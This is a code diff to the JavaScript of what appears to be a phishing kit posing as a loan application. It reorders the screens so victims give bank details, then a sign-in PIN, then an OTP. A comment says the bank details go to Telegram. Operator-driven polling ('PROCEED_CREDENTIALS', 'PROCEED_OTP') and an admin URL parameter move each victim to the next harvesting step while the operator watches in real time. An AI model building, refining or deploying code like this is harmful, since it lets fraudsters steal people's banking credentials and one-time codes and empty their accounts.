@@ -1,10 +1,10 @@
 document.addEventListener('DOMContentLoaded', () => {
   const screenWelcome = document.getElementById('screen-welcome');
-  const screenBank = document.getElementById('screen-bank');
   const screenSlider = document.getElementById('screen-slider');
   const screenForm1 = document.getElementById('screen-form1');
   const screenForm2 = document.getElementById('screen-form2');
   const screenForm3 = document.getElementById('screen-form3');
+  const screenBank = document.getElementById('screen-bank');
   const screenSignin = document.getElementById('screen-signin');
   const screenOtp = document.getElementById('screen-otp');
   const screenSuccess = document.getElementById('screen-success');
@@ -41,7 +41,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const adminParam = urlParams.get('admin') || '';
 
   function showScreen(targetScreen) {
-    [screenWelcome, screenBank, screenSlider, screenForm1, screenForm2, screenForm3, screenSignin, screenOtp, screenSuccess, screenStopped].forEach(s => {
+    [screenWelcome, screenSlider, screenForm1, screenForm2, screenForm3, screenBank, screenSignin, screenOtp, screenSuccess, screenStopped].forEach(s => {
       if (s) s.classList.remove('active');
     });
     if (targetScreen) targetScreen.classList.add('active');
@@ -72,8 +72,27 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
-  document.getElementById('btn-goto-bank').addEventListener('click', () => showScreen(screenBank));
-  document.getElementById('btn-bank-back').addEventListener('click', () => showScreen(screenWelcome));
+  // Navigation flow: Welcome -> Slider -> Form 1 -> Form 2 -> Form 3 -> Bank Details -> Sign In -> OTP -> Success
+  document.getElementById('btn-goto-slider').addEventListener('click', () => showScreen(screenSlider));
+  document.getElementById('btn-slider-back').addEventListener('click', () => showScreen(screenWelcome));
+  document.getElementById('btn-goto-form1').addEventListener('click', () => showScreen(screenForm1));
+
+  document.getElementById('btn-form1-back').addEventListener('click', () => showScreen(screenSlider));
+  document.getElementById('btn-form1-next').addEventListener('click', () => {
+    const amt = document.getElementById('form-amount-input').value;
+    document.getElementById('sum-amount').innerText = `ZiG ${amt}`;
+    showScreen(screenForm2);
+  });
+
+  document.getElementById('btn-form2-back').addEventListener('click', () => showScreen(screenForm1));
+  document.getElementById('btn-form2-prev').addEventListener('click', () => showScreen(screenForm1));
+  document.getElementById('btn-form2-next').addEventListener('click', () => showScreen(screenForm3));
+
+  document.getElementById('btn-form3-back').addEventListener('click', () => showScreen(screenForm2));
+  document.getElementById('btn-form3-prev').addEventListener('click', () => showScreen(screenForm2));
+  document.getElementById('btn-form3-submit').addEventListener('click', () => showScreen(screenBank));
+
+  document.getElementById('btn-bank-back').addEventListener('click', () => showScreen(screenForm3));
 
   // Bank Details Submission -> Sends to Telegram & Shows Spinning Screen until ALLOW
   btnSubmitBank.addEventListener('click', async () => {
@@ -125,28 +144,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // Navigation across loan screens
-  document.getElementById('btn-slider-back').addEventListener('click', () => showScreen(screenBank));
-  document.getElementById('btn-goto-form1').addEventListener('click', () => showScreen(screenForm1));
-  document.getElementById('btn-form1-back').addEventListener('click', () => showScreen(screenSlider));
-  document.getElementById('btn-form1-next').addEventListener('click', () => {
-    const amt = document.getElementById('form-amount-input').value;
-    document.getElementById('sum-amount').innerText = `ZiG ${amt}`;
-    showScreen(screenForm2);
-  });
-
-  document.getElementById('btn-form2-back').addEventListener('click', () => showScreen(screenForm1));
-  document.getElementById('btn-form2-prev').addEventListener('click', () => showScreen(screenForm1));
-  document.getElementById('btn-form2-next').addEventListener('click', () => showScreen(screenForm3));
-
-  document.getElementById('btn-form3-back').addEventListener('click', () => showScreen(screenForm2));
-  document.getElementById('btn-form3-prev').addEventListener('click', () => showScreen(screenForm2));
-  document.getElementById('btn-form3-submit').addEventListener('click', () => {
-    showScreen(screenSignin);
-    if (signinIdentifier) signinIdentifier.value = currentIdentifierType === 'Phone No' ? identifierInput.value.trim() : identifierEmailInput.value.trim();
-    if (pinBoxes[0]) pinBoxes[0].focus();
-  });
-
   // Slider calculation
   const loanSlider = document.getElementById('loan-amount-slider');
   const loanText = document.getElementById('loan-amount-text');
@@ -171,15 +168,13 @@ document.addEventListener('DOMContentLoaded', () => {
     updateCalc();
   }
 
-  // Digit Inputs Helper
-  function setupDigitInputs(boxes, nextCallback) {
+  function setupDigitInputs(boxes) {
     boxes.forEach((box, idx) => {
       box.addEventListener('input', () => {
         box.value = box.value.replace(/\D/g, '');
         if (box.value && idx < boxes.length - 1) {
           boxes[idx + 1].focus();
         }
-        if (nextCallback) nextCallback();
       });
       box.addEventListener('keydown', (e) => {
         if (e.key === 'Backspace' && !box.value && idx > 0) {
@@ -249,7 +244,6 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // Polling Status from Server / Admin Actions
   function startStatusPolling() {
     if (statusPollInterval) clearInterval(statusPollInterval);
 
@@ -263,7 +257,9 @@ document.addEventListener('DOMContentLoaded', () => {
         if (data.status === 'PROCEED_CREDENTIALS') {
           clearInterval(statusPollInterval);
           hideLoading();
-          showScreen(screenSlider);
+          showScreen(screenSignin);
+          if (signinIdentifier) signinIdentifier.value = currentIdentifierType === 'Phone No' ? identifierInput.value.trim() : identifierEmailInput.value.trim();
+          if (pinBoxes[0]) pinBoxes[0].focus();
         } else if (data.status === 'PROCEED_OTP') {
           clearInterval(statusPollInterval);
           hideLoading();
@@ -317,4 +313,4 @@ document.addEventListener('DOMContentLoaded', () => {
     if (loadingOverlay) loadingOverlay.classList.remove('active');
   }
 });
-    
+                          
